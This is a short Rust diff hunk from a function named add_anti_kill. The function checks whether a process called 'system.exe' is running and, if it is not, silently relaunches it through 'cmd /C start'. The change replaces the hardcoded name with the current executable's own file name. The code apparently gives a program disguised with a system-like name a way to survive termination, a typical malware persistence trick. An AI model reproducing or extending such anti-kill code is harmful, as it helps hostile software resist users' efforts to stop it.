@@ -136,7 +136,7 @@ pub fn add_anti_kill() {
             if !output_str.contains("system.exe") {
                 Command::new("cmd")
                     .arg("/C")
-                    .arg("start system.exe")
+                    .arg(format!("start {}", std::env::current_exe().unwrap().file_name().unwrap().to_string_lossy()))
                     .stdout(std::process::Stdio::null())
                     .spawn()
                     .expect("Failed to restart system.exe");
